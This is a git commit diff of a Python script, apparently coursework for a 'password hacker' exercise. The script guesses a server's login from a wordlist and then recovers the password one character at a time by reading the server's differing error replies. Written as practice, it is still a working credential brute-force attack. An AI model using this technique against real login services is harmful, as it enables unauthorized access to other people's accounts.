467a89699b55cddb0447592789b589ac4ccf8c90
spaceowlsoul <yuliasunny007@gmail.com>
2022-09-23 21:28:40 +0300

    passwords for stage 4/5

--- main.py
+++ main.py
@@ -1,41 +1,52 @@
+import json
 import sys
 import socket
-import itertools
+import string
 
 
-def establish_connection():
+def establish_connection(client_socket):
     args = sys.argv
     ip_address, port = args[1], args[2]
     client_socket.connect((ip_address, int(port)))
 
 
-def generate_password():
-    with open('passwords.txt', 'r') as file:
+def send_receive(client_socket, buff_size, data):
+    client_socket.send(json.dumps(data).encode())
+    response = json.loads(client_socket.recv(buff_size).decode())
+    return response
+
+
+def guessing_login(client_socket, data, buff_size):
+    with open("logins.txt", "r") as file:
         for line in file:
-            if not line.isdigit():
-                for p in itertools.product(*([letter.lower(), letter.upper()] for letter in line.rstrip('\n'))):
-                    yield ''.join(p)
-            else:
-                yield line
+            data["login"] = line.rstrip('\n')
+            response = send_receive(client_socket, buff_size, data)
+            if response == {"result": "Wrong password!"}:
+                return data
 
 
-def guessing():
-    buff_size = 1024
-    for guess_pass in generate_password():
-        client_socket.send(guess_pass.encode())
-        response = client_socket.recv(buff_size)
-        response = response.decode()
-        if response == 'Connection success!':
-            print(guess_pass)
-            break
+def guessing_password(client_socket, data, buff_size):
+    symbols = string.ascii_letters + string.digits
+    while True:
+        for symbol in symbols:
+            data["password"] += symbol
+            response = send_receive(client_socket, buff_size, data)
+            if response == {"result": "Wrong password!"}:
+                data["password"] = data["password"][:-1]
+            elif response == {"result": "Connection success!"}:
+                return data
 
 
 def main():
-    establish_connection()
-    guessing()
-    client_socket.close()
+    buff_size = 1024
+    data = {"login": '', "password": ''}
+    with socket.socket() as client_socket:
+        establish_connection(client_socket)
+        guessing_login(client_socket, data, buff_size)
+        guessing_password(client_socket, data, buff_size)
+        print(json.dumps(data))
+        client_socket.close()
 
 
-with socket.socket() as client_socket:
-    if __name__ == "__main__":
-        main()
+if __name__ == "__main__":
+    main()
